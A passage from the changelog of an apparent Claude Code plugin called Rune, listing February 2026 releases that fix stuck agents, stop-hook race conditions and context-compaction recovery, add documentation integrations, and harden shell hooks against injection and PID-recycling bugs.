- **Accumulated auto-fix for zsh compat hook (BACK-016)** — Checks B-E now accumulate all
  applicable fixes in a single pass instead of exiting after the first match. Previously,
  commands with multiple zsh issues (e.g., unprotected glob AND `\!=`) only got the first
  fix applied. Net reduction of 59 lines.

## [1.120.0] - 2026-02-28

### Added
- **Context7 MCP integration** — Added `context7` MCP server (`@upstash/context7-mcp`) for live
  framework and library documentation. `lore-scholar` uses Context7's `resolve-library-id` and
  `get-library-docs` tools as its primary documentation source during `/rune:devise` Phase 1C
  external research, with WebSearch/WebFetch as fallback. `practice-seeker` uses Tavily/Brave MCP
  as its primary source, with WebSearch/WebFetch as fallback.
- **Talisman `plan` config section** — New talisman configuration for research control:
  - `plan.external_research`: Controls research agent behavior (`always`/`auto`/`never`).
    `always` and `never` bypass modes skip Phase 1B scoring entirely. `auto` (default) uses
    enhanced risk signals with a lowered 0.25 threshold.
  - `plan.research_urls`: User-provided URLs fed to research agents with SSRF-defensive
    sanitization (IP blocklist, private TLD blocklist, sensitive param stripping, max 10 URLs,
    2048 char limit per URL). URLs wrapped in `<url-list>` tags with data-not-instructions marker.
- **Phase 1B scoring enhancements** — Two new risk signals:
  - User-provided URLs (+0.30 weight) — presence of `research_urls` strongly signals external
    context is needed
  - Unfamiliar framework (+0.20 weight) — framework mentioned in feature description but absent
    from project dependencies
- **Practice-seeker fallback chain** — Tavily/Brave MCP → WebSearch → WebFetch → offline knowledge.
  Graceful degradation when MCP tools are unavailable.
- **Lore-scholar fallback chain** — Context7 MCP → Tavily MCP → WebSearch → WebFetch → offline knowledge.
  Graceful degradation when MCP tools are unavailable.

### Changed
- **Phase 1B threshold backwards compatibility** — LOW_RISK threshold lowered from 0.35 to 0.25,
  but ONLY when `plan.external_research` is explicitly set to `"auto"`. When the plan talisman
  section is absent (legacy behavior), the original 0.35 threshold is preserved. This ensures
  zero behavior change for existing users without talisman plan config.
- **Risk signal weight redistribution** — Base score weights (sum to 85%):
  Keywords 40%→35%, File paths 30%→25%, External API 20%→15%, Framework 10%→10%.
  Two new additive bonuses applied on top of base score (capped at 1.0):
  User-provided URLs (+0.30 when present), Unfamiliar framework (+0.20 when detected).

### Upgrading
- **No action required** for existing users. Absent `plan` section in talisman preserves all
  prior behavior (legacy 0.35 LOW_RISK threshold, no URL injection, original risk weights).
- To opt in: add `plan:` section to `.claude/talisman.yml` — see `talisman.example.yml` for
  the full schema with `external_research` and `research_urls` fields.
- Context7 MCP server is auto-connected via `.mcp.json` — no manual setup needed. Requires
  Node.js for `npx` execution.

## [1.119.0] - 2026-02-28

### Fixed
- **Fix stuck rune-smith agents in agent teams** — Work agents (`rune-smith`, `trial-forger`,
  `design-iterator`, `design-sync-agent`) could get stuck in infinite active loops during
  `/rune:strive` and `/rune:arc` workflows, consuming massive tokens without completing tasks.
  Three-layer fix:
  - **TeammateIdle hook bypass for work teams**: `on-teammate-idle.sh` no longer blocks work
    agents from going idle due to missing output files. Work agents communicate via SendMessage
    (Seal) and TaskUpdate, not output files. The Layer 4 "all tasks done" signal remains active
    for all team types.
  - **maxTurns reduction**: Work agents reduced from `maxTurns: 120` to `maxTurns: 60` as a
    safety cap. Typical workload (5-6 tasks x 8-10 turns) fits within 60 turns. Override via
    `talisman.yml` → `teammate_lifecycle.max_turns.work`.
  - **Runtime budget enforcement**: Strive Phase 3 now tracks worker spawn times and sends
    `shutdown_request` to workers exceeding `max_runtime_minutes` (default: 20). Released tasks
    become available for reclaim. `guard-context-critical.sh` writes a `force_shutdown` signal
    at critical threshold (25% remaining) for emergency worker shutdown.
- New talisman key: `teammate_lifecycle.max_runtime_minutes` (default: `20`, set to `999` to disable)

## [1.118.0] - 2026-02-28

### Changed
- **Arc-batch smart ordering is now behavior opt-in (user-controlled, not forced on glob inputs)** — Smart plan ordering in `/rune:arc-batch`
  Phase 1.5 is no longer forced on all inputs. New behavior:
  - Glob inputs prompt the user with 3 options (Smart ordering / Alphabetical / As discovered)
  - Queue files (`.txt`) respect user-specified order by default
  - `--smart-sort` flag forces smart ordering on any input type
  - `--no-smart-sort` flag disables ordering (unchanged)
  - New talisman key `arc.batch.smart_ordering.mode` controls behavior:
    `"ask"` (default, prompt user), `"auto"` (pre-v1.118.0 behavior), `"off"` (disable)
  - Token-based flag parsing prevents `--smart-sort` substring collision with `--no-smart-sort`
  - Resume mode guard runs before talisman checks (prevents reordering partial batches)

## [1.117.0] - 2026-02-28

### Added
- **Phase 5.2: Citation Verification** — deterministic grep-based verification of
  TOME file:line citations before todo generation and mend. Catches phantom citations
  (non-existent files, out-of-range lines, pattern mismatches). Configurable via
  `review.verify_tome_citations` in talisman. SEC-prefixed findings always verified
  at 100%. Inspired by rlm-claude-code's Epistemic Verification pipeline.
- `[UNVERIFIED]` and `[SUSPECT]` tags on TOME findings with failed citations
- `## Citation Verification` section in TOME output with per-finding verdicts
- Mend-fixer skips UNVERIFIED findings, applies extra caution on SUSPECT findings
- 3 new talisman keys: `review.verify_tome_citations`, `review.citation_verify_priorities`,
  `review.citation_sampling_rate`

## [1.116.1] - 2026-02-27

### Fixed
- **Fix parallel Stop hook race condition in GUARD 6.5** — Claude Code fires Stop hooks in parallel, not sequentially. When the arc phase loop completes (all phases done), the phase hook removes its state file while the outer loop hooks (batch/hierarchy/issues) simultaneously check for it. Due to the race, outer hooks see the file still exists and skip via GUARD 6.5/7.5, causing the batch to get stuck after the final phase (merge). Fix adds a 2-second retry loop (4x500ms) in GUARD 6.5/7.5 to wait for the phase state file to be removed by the parallel phase hook before skipping. Affects `arc-batch-stop-hook.sh`, `arc-hierarchy-stop-hook.sh`, and `arc-issues-stop-hook.sh`.

## [1.116.0] - 2026-02-27

### Added
- **Phase 5.0 Pre-Aggregate** — Deterministic marker-based extraction of Ash findings before Runebinder ingestion. Threshold-gated (default 25KB combined Ash output). Expected 40-60% byte reduction on large reviews. Configurable via `review.pre_aggregate.*` talisman keys. Runs at Tarnished level (no subagent, no LLM call). Per-wave support for deep reviews.
- **Context-weaving Layer 1.5** — Inter-Agent Output Compression documentation in context-weaving skill
- **Compression metrics report** — `condensed/_compression-report.md` with per-Ash breakdown (original bytes, condensed bytes, finding count, ratio)
- **Pre-aggregate reference algorithm** — `roundtable-circle/references/pre-aggregate.md` with complete pseudocode for 9 functions (preAggregate, extractFindingBlocks, parseMarkerAttributes, compressFinding, truncateRuneTrace, convertToOneLiner, extractSection, extractHeader, writeCompressionReport)
- New talisman config section: `review.pre_aggregate` with `enabled`, `threshold_bytes`, `preserve_priorities`, `truncate_trace_lines`, `nit_summary_only`

### Changed
- **Phase 5 (Aggregate)** — Runebinder reads from `condensed/` directory when Phase 5.0 pre-aggregation was applied. Prompt updated to acknowledge pre-compressed inputs.
- **Overflow wards** — Pre-aggregation is now first-line defense before manual Runebinder fallback
- Runebinder agent definition and prompt template updated with condensed input documentation

## [1.115.1] - 2026-02-27

### Fixed
- **Defer arc-result signal deletion to Phase B** — Prevents stuck session when arc-batch/arc-issues stop hooks read `tmp/arc-result-current.json` before Phase B cleanup. Signal file is now deleted in Phase B (batch loop iteration) instead of Phase A (arc-phase stop hook), ensuring stop hook chain reads valid data. Adds fail-forward guards to `arc-batch-stop-hook.sh`, `arc-issues-stop-hook.sh`, `enforce-glyph-budget.sh`, `on-task-observation.sh`, and other operational scripts.

## [1.115.0] - 2026-02-27

### Added
- **Fail-forward ERR trap guards for all OPERATIONAL hooks** — Added `_rune_fail_forward` ERR trap to 16 hook scripts. Prevents unexpected script crashes from stalling workflows by converting crashes to `exit 0` (allow). Trace-enabled logging to `$RUNE_TRACE_LOG` when `RUNE_TRACE=1` captures crash location (`BASH_LINENO[0]`) and script name (`${BASH_SOURCE[0]##*/}`). Based on rlm-claude-code ADR-002 "Fail-Forward Behavior".
  - Phase 1 (HIGH PRIORITY — 7 blocking PreToolUse hooks): `enforce-polling.sh`, `enforce-zsh-compat.sh`, `enforce-teams.sh`, `enforce-team-lifecycle.sh`, `on-teammate-idle.sh`, `on-task-completed.sh`, `validate-inner-flame.sh`
  - Phase 2 (MEDIUM PRIORITY — 9 non-blocking hooks): `stamp-team-session.sh`, `verify-team-cleanup.sh`, `session-start.sh`, `session-team-hygiene.sh`, `session-compact-recovery.sh`, `pre-compact-checkpoint.sh`, `echo-search/annotate-hook.sh`, `talisman-invalidate.sh`, `talisman-resolve.sh`
- **Hook Crash Classification in CLAUDE.md** — New "Hook Crash Classification (ADR: Fail-Forward)" subsection documenting SECURITY vs OPERATIONAL hook categories, fail-closed vs fail-forward behavior, and ERR trap semantics.
- **SECURITY hook annotation for `enforce-readonly.sh`** — Explicit fail-closed classification comment. This is the sole hook that intentionally has NO ERR trap (crash → blocks operation for SEC-001 protection).

## [1.114.0] - 2026-02-27

### Added
- **Talisman Shard Resolver** — SessionStart hook pre-processes `talisman.yml` into per-namespace JSON shards for 94% token reduction. 12 data shards (`arc`, `codex`, `review`, `work`, `goldmask`, `plan`, `gates`, `settings`, `inspect`, `testing`, `audit`, `misc`) + `_meta.json` commit signal. Includes `talisman-invalidate.sh` PostToolUse hook for mid-session talisman edits, graceful YAML parser fallback chain (python3+PyYAML → yq → skip), defaults registry (`talisman-defaults.json`), and atomic shard writes via `mktemp`+`mv`.
- New `readTalismanSection()` pseudo-function — reads pre-resolved JSON shards with automatic fallback to full-file read. Replaces `readTalisman()` as the preferred talisman access pattern.
- New build script `build-talisman-defaults.py` — generates `talisman-defaults.json` from `talisman.example.yml` with documented defaults injection.
- `/rune:rest` now cleans up `tmp/.talisman-resolved/` (regenerated at next SessionStart).

### Changed
- **readTalisman() → readTalismanSection()** — 41 execution-path talisman read sites migrated to shard-aware access pattern (108 total references including docs and examples). Composite shards group co-accessed sections: `gates` (elicitation, horizon, evidence, doubt_seer), `settings` (version, cost_tier, rune-gaze, ashes, echoes), `misc` (15 low-frequency sections). Duplicate reads in `ship-phase.md` and `plan-review.md` eliminated. Token reduction estimated from file size ratio: ~300 bytes shard vs ~3.6KB full file.

## [1.113.2] - 2026-02-27

### Fixed
- **PreCompact hook uses systemMessage instead of unsupported hookSpecificOutput** — Simplified `pre-compact-checkpoint.sh` to use `systemMessage` field directly, removing the `hookSpecificOutput` wrapper that caused hook errors since PreCompact does not support `hookSpecificOutput`.
- **SEC-P2-001: stdin pipe safety in enforcement hooks** — Added `2>/dev/null || true` to `head -c 1048576` in `enforce-readonly.sh`, `enforce-teams.sh`, `enforce-polling.sh`. Prevents silent script termination under `set -euo pipefail` when stdin is empty.
- **SEC-P2-002: echo→printf in enforce-readonly.sh** — Replaced `echo "$INPUT"` with `printf '%s\n' "$INPUT"` for jq piping to prevent escape sequence interpretation.
- **SEC-P1-001: PID recycling guard in on-session-stop.sh** — Re-verifies process command name before SIGKILL after 2s grace period to prevent killing unrelated processes due to PID recycling.
- **BACK-P2-001: double kill -0 in resolve-session-identity.sh** — Consolidated `rune_pid_alive()` into a single `kill -0` call that captures both exit code and stderr, eliminating TOCTOU window.
- **BACK-P2-007: undefined RESOLVED_CONFIG_DIR in on-teammate-idle.sh** — Replaced `${RESOLVED_CONFIG_DIR:-unknown}` with `${RUNE_CURRENT_CFG:-unknown}` to restore session isolation in all-tasks-done signal.
- **BACK-P2-003: silent array truncation in echo-search upsert_semantic_group** — Added length validation between `entry_ids` and `similarities` arrays; raises `ValueError` instead of silently truncating via `zip()`.
- **QUAL-P2-004: silent ValueError in node_parser.py** — Added `logger.debug()` to 6 `except ValueError: pass` blocks for unrecognized Figma API enum values, providing diagnostic visibility.
- **SEC-P3-002: Figma API depth clamp** — Added `depth = min(depth, 10)` in `figma_client.py:get_file()` as defense-in-depth.

### Changed
- Updated README badges and component counts to reflect actual totals (89 agents, 41 skills)

## [1.113.1] - 2026-02-27

### Fixed
- **Wire file-todos integration into strive, roundtable-circle, mend, and arc SKILL.md** — Added Phase 5.4 Todo Generation section to roundtable-circle SKILL.md (mandatory todo creation from TOME findings). Added Per-Task File-Todo Creation directive to strive SKILL.md Phase 1. Upgraded mend Phase 5.9 from passive reference to explicit algorithm summary. Added session-scoped todos documentation to arc SKILL.md. References `buildManifests()` from `manifest-schema.md` for work source manifest computation.

## [1.113.0] - 2026-02-27

### Added
- **Evidence-based plan validation with grounding gate** — New `evidence-verifier` utility agent that systematically validates every factual claim in plan documents against the actual codebase, documentation, and external sources. Produces quantitative per-claim and per-section grounding scores with a weighted overall plan grounding score.
  - 3-layer verification protocol: Codebase (weight 1.0) > Documentation (weight 0.8) > External (weight 0.6)
  - 7 claim types: file existence, API/function existence, pattern references, dependency claims, structural claims, count claims, behavior claims
  - Verdict mapping: >= 0.6 PASS, >= 0.4 CONCERN, < 0.4 BLOCK. Any FALSE claim forces BLOCK
  - Integrated into `/rune:devise` Phase 4C (plan-review.md) and `/rune:arc` Phase 2 (arc-phase-plan-review.md)
  - Talisman gate: `evidence.enabled` (default: true, opt-out). External search gated by `evidence.external_search` (default: false)
  - Evidence Chain section support in plan templates (synthesize.md)
  - Echo integration for historical verification pattern awareness
- New talisman config section: `evidence` with `enabled`, `external_search`, `require_evidence_chain`, `block_threshold`, `concern_threshold`

## [1.112.0] - 2026-02-27

### Added
- **4-layer defense against stuck teammates** — prevents teammates from hanging indefinitely when team lead context is exhausted
  - Layer 1: Proactive context-aware early shutdown signal at 35% remaining context (`guard-context-critical.sh`)
  - Layer 2: `maxTurns` safety net on ALL 88 agents (58 agents previously missing)
  - Layer 3: Process-level SIGTERM/SIGKILL cleanup in `on-session-stop.sh`
  - Layer 4: TeammateIdle "all tasks done" coordination signal (`on-teammate-idle.sh`)
- New talisman config section: `teammate_lifecycle` with `max_turns`, `shutdown_signal_threshold`, `process_cleanup`
- Shutdown signal file: `tmp/.rune-shutdown-signal-{SESSION_ID}.json` written at context warning level
- All-tasks-done signal: `tmp/.rune-signals/{TEAM_NAME}/all-tasks-done` for faster completion detection

### Changed
- `guard-context-critical.sh`: WARNING tier (35%) now writes shutdown signal file in addition to advisory
- `on-session-stop.sh`: New AUTO-CLEAN PHASE 0 kills orphaned teammate processes before filesystem cleanup
- `on-teammate-idle.sh`: Writes coordination signal when all team tasks are completed
- 58 agent files: Added `maxTurns` frontmatter (4 work, 11 utility, 5 research, 38 review)

## [1.111.2] - 2026-02-27

### Added
- **3-tier adaptive compaction for arc-phase-stop-hook** — Replaces the previous "heavy phases only" compact interlude with a 3-tier trigger system: (1) Heavy phases — always compact before `work`, `code_review`, `mend` (unchanged); (2) Context-aware — reads the statusline bridge file and compacts when remaining context <= 50%; (3) Interval fallback — compacts every 6 completed phases when the bridge file is unavailable. This prevents context exhaustion during the 23 non-heavy phases in a 26-phase arc run, especially in batch mode where the outer loop needs context budget for plan transitions.
- **Parameterized `_check_context_at_threshold()` in stop-hook-common.sh** — Refactored `_check_context_critical()` into a generic threshold checker. New `_check_context_compact_needed()` wrapper uses 50% threshold for compaction decisions. Both share identical bridge file reading, UID ownership, and freshness logic.

## [1.111.1] - 2026-02-27

### Fixed
- **Arc-batch stuck after 1 plan due to phase-isolated context exhaustion** — Since v1.110.0, `arc-phase-stop-hook.sh` always injected a summary prompt (`decision:"block"`) at phase loop completion, even when an outer batch/hierarchy/issues loop was active. This burned one extra context turn that the outer loop needed for the plan-to-plan transition, causing context exhaustion after Plan 1. Now exits silently when an outer loop state file is detected, preserving context budget for the transition.
- **Outer loop hooks (batch/hierarchy/issues) ran expensive operations during phase turns** — Added GUARD 6.5 (batch/issues) and GUARD 7.5 (hierarchy) that fast-exits when `arc-phase-loop.local.md` exists. Prevents wasted checkpoint scanning, progress file updates, and summary writing during intermediate phase turns — operations that could exceed the 15s hook timeout and silently kill the hook.
- **Bridge file freshness too tight for phase-isolated arc** — Increased `_check_context_critical()` freshness tolerance from 60s to 180s. In phase-isolated arc, the statusline bridge file can be 60-120s old by the time outer loop hooks fire (phase completion turn + hook chain processing time). 60s caused the context check to always fail-open, making GUARD 11 effectively inoperable.

## [1.111.0] - 2026-02-27

### Added
- **Checkpoint schema v18→v19: per-phase timing timestamps** — Each phase now records `started_at` and `completed_at` ISO timestamps in the checkpoint. Enables accurate per-phase duration tracking, stagnation detection, and audit trails. Migration script upgrades existing v18 checkpoints on resume.
- **`rune-status.sh` diagnostic script** — New `scripts/rune-status.sh` reports arc pipeline health: active arc detection, current phase, phase durations, stagnation indicators, team/task status, and loop state files. Readable summary for debugging stuck arcs without cancelling.
- **`--status` flag on `/rune:cancel-arc`** — When `--status` is passed, the command runs `rune-status.sh` and displays the diagnostic report instead of cancelling. Provides a safe, read-only inspection path without risk of accidental cancellation.
- **Stagnation sentinel adaptive budgeting** — Auto-detected from per-phase timing in v19 checkpoints. Stagnation patterns (phase exceeding 2× estimated duration) surface in `rune-status.sh` output and inform `arc-phase-stop-hook.sh` compact interlude decisions.

## [1.110.0] - 2026-02-27

### Added
- **Phase-Isolated Context Architecture** — Each arc phase now runs as its own Claude Code turn with fresh context. New `arc-phase-stop-hook.sh` drives phase iteration via the Stop hook pattern. Each phase only loads its own reference file (~100-400 lines) instead of the full SKILL.md. Context resets fully between phases. The checkpoint serves as the inter-phase handoff mechanism.
- **`arc-phase-stop-hook.sh`** — New Stop hook that iterates over phases within a single arc plan. Mirrors `arc-batch-stop-hook.sh` structure but operates at the phase level (inner loop). Includes guard chain (jq, input, CWD, state file, symlink, session isolation), PHASE_ORDER array (26 phases), phase-to-reference-file mapping, compact interlude before heavy phases, and completion handling.
- **Arc reference files** — Extracted from SKILL.md: `arc-phase-constants.md` (PHASE_ORDER, timeouts, cycle budgets), `arc-architecture.md` (pipeline diagram, orchestrator design, transition contracts), `arc-failure-policy.md` (per-phase failure matrix, error handling table).
- **Arc-batch reference files** — Extracted from SKILL.md: `batch-shard-parsing.md` (shard group detection algorithm), `batch-loop-init.md` (Phase 5 session isolation, state file, first arc invocation).
- **Orphaned checkpoint cleanup** — `session-team-hygiene.sh` now scans `.claude/arc/` and `tmp/arc/` for checkpoints with dead `owner_pid`. `/rune:rest --heal` removes orphaned checkpoint directories.

### Fixed
- **Bug 1: `arc_session_id` never written to `batch-progress.json`** — `_read_arc_result_signal()` in `stop-hook-common.sh` now extracts `.arc_id` from the signal file. Both `arc-batch-stop-hook.sh` and `arc-issues-stop-hook.sh` write `arc_session_id` to progress entries. Checkpoint `.id` used as fallback when signal is unavailable.
- **Bug 2: Orphaned checkpoints accumulate infinitely** — `session-team-hygiene.sh` detects and reports stale checkpoints at session start. `rest.md --heal` removes them.
- **Bug 4: `in_progress` plans stuck forever on `--resume`** — `arc-batch` Phase 0 resume logic now resets stale `in_progress` plans to `pending` with `recovery_note` field before building the pending queue.

### Changed
- **Arc SKILL.md reduced from 1,383 to 274 lines** (80% reduction) — Now acts as a lightweight launcher: argument parsing, pre-flight, checkpoint creation, phase loop state file, and first phase invocation. All phase dispatch logic, constants, failure policy, and architecture diagrams moved to reference files.
- **Arc-batch SKILL.md reduced from 602 to 302 lines** (50% reduction) — Shard parsing, smart ordering pseudocode, and batch loop initialization extracted to reference files with summary + link in SKILL.md.
- **Stop hook ordering** — `arc-phase-stop-hook.sh` runs FIRST (inner loop), followed by `arc-batch-stop-hook.sh` (outer loop), `arc-hierarchy-stop-hook.sh`, `arc-issues-stop-hook.sh`, then `on-session-stop.sh`.
- **`on-session-stop.sh`** — Added Guard 5d for `.claude/arc-phase-loop.local.md` deferral (before Guard 5 batch deferral).

## [1.109.4] - 2026-02-27

### Fixed
- **ARC-BATCH-001: Stop hook re-injection fails to activate arc skill** — After context compaction, Claude didn't recognize `/rune:arc` as a Skill tool invocation. Changed all 3 stop hook ARC_PROMPTs (arc-batch, arc-issues, arc-hierarchy) from ambiguous `Execute: /rune:arc ...` to explicit `Skill("rune:arc", "...")` with CRITICAL anti-skip instructions. Prevents Claude from jumping directly to code implementation instead of invoking the arc pipeline.
- **ARC-BATCH-002: Arc pipeline stops after WORK phase on compaction** — After 5+ compactions, Claude lost the arc pipeline context and stopped after Phase 5 (WORK) instead of continuing to GAP ANALYSIS → ship → merge. Added PIPELINE CONTINUATION instruction to `session-compact-recovery.sh` that explicitly tells Claude to re-invoke `/rune:arc --resume` after completing the current phase. Applies to all arc phases, not just delegation-only phases.
- **ARC-BATCH-003: Compact recovery work hint ignored** — The `DELEGATION HINT: re-invoke /rune:strive` was ignored after heavy compaction. Enhanced hint to include explicit `Skill("rune:strive", ...)` invocation syntax.

## [1.109.3] - 2026-02-26

### Fixed (mend from review)
- **SEC-001: JSON injection via heredoc in signal writer** — Replaced `cat <<HEREDOC` shell interpolation with `jq -n --arg` for proper JSON escaping. Prevents malformed JSON from checkpoint fields containing quotes or backslashes.
- **SEC-003: Missing `umask 077` and EXIT trap in signal writer** — Added `umask 077` (parity with stop hooks) and EXIT trap for temp file cleanup on signal/kill.
- **SEC-004: CWD not canonicalized in signal writer** — Added `cd && pwd -P` canonicalization (parity with `resolve_cwd()` in stop-hook-common.sh).
- **SEC-005: Numeric field validation in signal writer** — Added `^[0-9]+$` guards for `PHASES_COMPLETED`, `PHASES_TOTAL`, `PHASES_FAILED` after IFS split.
- **SEC-006: arc-issues missing 3-tier state file removal** — Ported 3-tier persistence guard (rm → chmod+rm → truncate) from arc-batch to arc-issues "ALL PLANS DONE" block. Prevents infinite summary loop if `rm -f` fails.
- **SEC-007: grep boundary anchor fails at EOF** — Fixed `_find_arc_checkpoint()` numeric PID grep to use `([^0-9]|$)` with `-E` flag for EOF handling.
- **QUAL-001: PR_URL validation regex inconsistency** — Replaced permissive `^https?://` in arc-batch summary block with strict `^https://[a-zA-Z0-9._/-]+$` (parity with arc-issues BACK-005). Also added URL validation in signal writer.
- **DOC-001: `rest.md` missing signal file cleanup** — Added `rm -f tmp/arc-result-current.json` to rest.md cleanup section.
- **DOC-002: README.md missing script** — Added `arc-result-signal-writer.sh` to scripts directory tree.
- **DOC-003/004: "failed" status documentation clarification** — Added footnote to schema table and clarified function comment that "failed" is not produced by the hook.
- **DOC-005: arc-hierarchy exclusion rationale** — Added note explaining hierarchy uses provides/requires DAG, not signal-based detection.
- **BACK-003: Multiple jq calls in `_read_arc_result_signal()`** — Consolidated 4 separate `jq` invocations into a single `jq` call with tab-separated output and `IFS` split. Reduces subprocess overhead by ~75%.
- **QUAL-004: Missing "partial" count in summary blocks** — Both `arc-batch-stop-hook.sh` and `arc-issues-stop-hook.sh` summary templates now include partial plan count alongside completed/failed.
- **DOC-007: Symlink rejection test** — Added `test_signal_symlink_rejected` to `TestArcResultSignalDetection` verifying that symlinked signal files are rejected and checkpoint fallback is used.
- **BACK-005: Signal writer unit tests** — New `test_arc_result_signal_writer.py` with 12 tests covering fast-path exits (non-checkpoint, pending phases), completion detection (ship, merge, partial status, tmp/arc path), session identity preservation, and security guards (symlink rejection, PR URL validation).
- **QUAL-003: Structural divergence in arc-issues detection** — Restructured arc-issues 2-layer detection from split pattern (PR_URL and status extracted in 2 separate blocks 40 lines apart) to unified single-block pattern matching arc-batch. Eliminates maintenance risk from structural divergence.

## [1.109.2] - 2026-02-26

### Added
- **Arc Result Signal: Deterministic PostToolUse hook** — New `arc-result-signal-writer.sh` PostToolUse:Write|Edit hook replaces LLM-instructed signal write with a deterministic shell hook. The hook fires on every Write/Edit, fast-path exits in <5ms for non-checkpoint writes (grep check), and only triggers full logic when the written file is an arc checkpoint with `ship` or `merge` phase completed. Writes `tmp/arc-result-current.json` atomically (mktemp + mv). This decouples stop hooks from checkpoint internals — arc writes checkpoint, hook detects completion, writes signal. Stop hooks read signal (primary) → checkpoint scan (fallback). Zero prompt tokens consumed. Survives session compaction.
- **2-layer arc completion detection** — `arc-batch-stop-hook.sh` and `arc-issues-stop-hook.sh` now use `_read_arc_result_signal()` as primary detection (Layer 1), with `_find_arc_checkpoint()` as fallback (Layer 2) for crash recovery and pre-v1.109.2 arcs. This replaces the monolithic checkpoint-only detection.
- **`_read_arc_result_signal()` shared function** — New function in `stop-hook-common.sh` reads the explicit arc result signal with full session isolation (owner_pid + config_dir verification). Sets `ARC_SIGNAL_STATUS` and `ARC_SIGNAL_PR_URL` globals; returns 0 on success, 1 on fallback. Fail-open.

### Fixed
- **PERF: Summary block checkpoint scan eating hook timeout** — `arc-batch-stop-hook.sh` summary block (line 191) previously called `_find_arc_checkpoint()` to extract PR_URL BEFORE the main detection block. With 100+ checkpoint dirs, this scan consumed the 15s hook timeout budget, causing the hook to be killed without any output — resulting in "idle" behavior where the batch couldn't advance to the next plan. Now reads `tmp/arc-result-current.json` signal file first (O(1)), falling back to checkpoint scan only when signal is unavailable.

### Changed
- **Arc SKILL.md**: Replaced LLM-instructed `Write("tmp/arc-result-current.json", ...)` pseudocode with documentation that the signal is now written automatically by the PostToolUse hook. No manual Write() call needed.

## [1.109.1] - 2026-02-26

### Fixed
- **BUG: Checkpoint path divergence after session compaction** — `_find_arc_checkpoint()` in `stop-hook-common.sh` now searches BOTH `.claude/arc/` AND `tmp/arc/` directories. After session compaction, the arc pipeline may resume and write its checkpoint to `tmp/arc/` instead of the canonical `.claude/arc/`. Previously, searching only `.claude/arc/` would find a stale pre-compaction checkpoint (e.g., `ship=pending`) while the actual completed checkpoint lived at `tmp/arc/` (e.g., `ship=completed`, PR merged). This caused arc-batch and arc-issues to misdetect successful arcs as "failed" and break the batch chain.
- **BUG: `pr_url` nested location fallback** — `arc-batch-stop-hook.sh` and `arc-issues-stop-hook.sh` now check `phases.ship.pr_url` as fallback when top-level `pr_url` is null. After compaction, arc may store the PR URL only in the nested location.
- **Test: Add `write_checkpoint_file()` helper** — Tests that verify plan completion status now create mock checkpoint files with success evidence. Without a checkpoint, `ARC_STATUS` defaults to "failed" (v1.107.0 safe default), causing false test failures.
- **Test: Fix compact interlude phase awareness** — Tests expecting arc prompt output (`test_arc_prompt_contains_plan_path`, `test_arc_prompt_includes_truthbinding`, `test_no_merge_flag_included`, `test_processes_own_batch`) now use `compact_pending=True` to simulate Phase B (prompt injection) instead of Phase A (compact checkpoint).

## [1.109.0] - 2026-02-26

### Added
- **Deep Figma/Design Integration into Rune Core Workflows**
  - Revived 3 dead arc design phases (`design_extraction`, `design_verification`, `design_iteration`) in PHASE_ORDER with PHASE_TIMEOUTS and PHASE_PREFIX_MAP entries
  - Created Design Package reference document (`arc-phase-design-package.md`) with DCD schema and generation protocol
  - Created design knowledge skills (`figma.md`, `storybook.md`) in stacks/references/design/
  - Added frontend task classification to strive parse-plan for design-aware worker prompts
  - Added design context discovery and injection for strive workers
  - Wired `design-implementation-reviewer` into Forge Gaze topic registry (prefix: FIDE) and Roundtable Circle Stack Specialist table
  - Added Figma URL detection and design section generation to devise
  - Added `design_context` object to inscription schema (enabled, vsm_dir, dcd_dir, figma_url, fidelity_threshold, components, token_system)
  - Added `design_tools` field to `detected_stack` in inscription schema
  - Added Design Fidelity Gate to Rune Gaze Phase 1A (gated by `talisman.design_sync.enabled`)
  - Added DESIGN CONTEXT COORDINATION section to Glyph Scribe prompt (skip token compliance when FIDE active)
  - Added Design Stack Detection section to detection.md with Figma and Storybook signal tables

### Fixed
- Ghost skill references in context-router.md Step 5.7 (`design/figma`, `design/storybook`) — created missing files

## [1.108.1] - 2026-02-26

### Fixed
- **PERF: `_find_arc_checkpoint()` timeout with many checkpoints** — Replaced per-file `jq` calls with `grep`-based PID matching in `stop-hook-common.sh`. With 100+ checkpoint directories, individual `jq` invocations exceeded the 15-second Stop hook timeout, causing the hook to silently exit without outputting `decision: block` — breaking the arc-batch loop chain. `grep` is ~100x faster than `jq` for simple string matching. Also limits scanning to the 20 most recently modified checkpoints (sorted by mtime).

## [1.108.0] - 2026-02-26

### Changed
- Extract shared PreToolUse validation library (`scripts/lib/pretooluse-write-guard.sh`) from 3 worker path scripts (DRY) — ~50 lines saved per script
- Add session isolation to `validate-mend-fixer-paths.sh` and `validate-gap-fixer-paths.sh` (previously missing — only strive had it)
- Standardize stdin handling on `printf '%s'` across all validation scripts (replaces `echo "$INPUT"` in mend-fixer)

## [1.107.5] - 2026-02-26

### Fixed
- **BUG-1: `_STATE_TMP` temp file leak in EXIT traps** — All 3 Stop hook loop drivers (`arc-batch-stop-hook.sh`, `arc-issues-stop-hook.sh`, `arc-hierarchy-stop-hook.sh`) now clean `_STATE_TMP` in their EXIT trap. Previously, if the ERR trap fired during a `sed`/`awk` compact interlude rewrite, `_STATE_TMP` leaked as an orphaned 0-byte file (e.g., `.claude/arc-batch-loop.local.md.eZPhOf`). The `arc-issues-stop-hook.sh` EXIT trap was a no-op (`trap 'exit' EXIT`) — now properly cleans up.
- **BUG-2: `_abort_batch` too aggressive on context exhaustion** — GUARD 10 `else` branch and GUARD 11 in `arc-batch-stop-hook.sh` and `arc-issues-stop-hook.sh` now call `_graceful_stop_batch()` / `_graceful_stop_issues_batch()` instead of `_abort_batch()` / `_abort_issues_batch()`. The graceful variant sets batch status to `"stopped"` with `stop_reason: "context_exhaustion_graceful"` but leaves pending plans as-is (not marked `"failed"`), making them resumable via `--resume` from a fresh session. `arc-hierarchy-stop-hook.sh` already used `_pause_hierarchy()` — no change needed.
- **BUG-3: No pre-read guard before compact interlude rewrites** — Added `[[ ! -s "$STATE_FILE" ]]` pre-read guards before all `sed`/`awk` calls that read the state file in the compact interlude (Phase A, Phase B, and iteration increment). If the state file was empty or deleted between guards and the rewrite, `sed` would write 0 bytes to the temp file, `mv` would succeed, and F-05 verification would delete the now-empty state file — leaving orphaned temp files and corrupted state.

## [1.107.4] - 2026-02-26

### Fixed
- **GUARD 11: Context-critical Stop hook defense (F-13)** — All 3 Stop hook loop drivers now check context level via statusline bridge file before injecting arc prompts. New `_check_context_critical()` shared function in `stop-hook-common.sh` reads the bridge file (60s freshness, UID-scoped, fail-open). Closes the blind spot where Stop hooks could inject massive prompts into a nearly-full context window, causing immediate exhaustion.
